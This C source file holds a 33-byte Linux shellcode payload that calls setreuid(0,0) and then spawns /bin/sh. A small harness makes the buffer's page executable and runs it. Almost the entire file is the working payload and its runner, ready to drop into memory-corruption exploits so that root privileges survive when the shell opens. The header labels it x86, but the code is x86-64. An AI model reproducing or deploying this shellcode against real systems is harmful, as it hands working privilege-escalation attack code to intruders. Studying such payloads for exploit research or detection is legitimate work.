/*
 * (Linux/x86) setreuid(0,0) + execve("/bin/sh", ["/bin/sh", NULL])
 * - 33 bytes
 * - xgc@gotfault.net
 *
 */

#include <sys/mman.h>
#include <limits.h>
#ifndef PAGESIZE
#define PAGESIZE 4096
#endif

static const char shellcode[] =

  "\x6A\x71"                    // push   $0x71
  "\x58"                        // pop    %rax
  "\x48\x31\xF6"                // xor    %rsi, %rsi
  "\x48\x31\xFF"                // xor    %rdi, %rdi
  "\x0F\x05"                    // syscall

  "\x48\x31\xf6"                // xor    %rsi, %rsi
  "\x56"                        // push   %rsi
  "\x48\xbf\x2f\x62\x69\x6e\x2f"// movabs %rdi,0x68732f2f6e69622f "/bin/sh/"
  "\x2f\x73\x68"
  "\x57"                        // push %rdi
  "\x54"                        // push %rsp
  "\x5f"                        // pop  %rdi
  "\xb0\x3b"                    // mov al,0x3b
  "\x99"                        // cdq
  "\x0f\x05";                   // syscall

int main() {
        unsigned long *d, *p;
        p = shellcode;
        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        printf("Address: %lx\n", shellcode);
        d = (unsigned long *) ( (long)p &~(PAGESIZE-1));
        printf("Address of page start: %lx\n", d);

        int mprotect_result = mprotect(d, 1024, PROT_EXEC|PROT_READ);
        printf("mprotect_result: %d\n", mprotect_result);
        f();
}

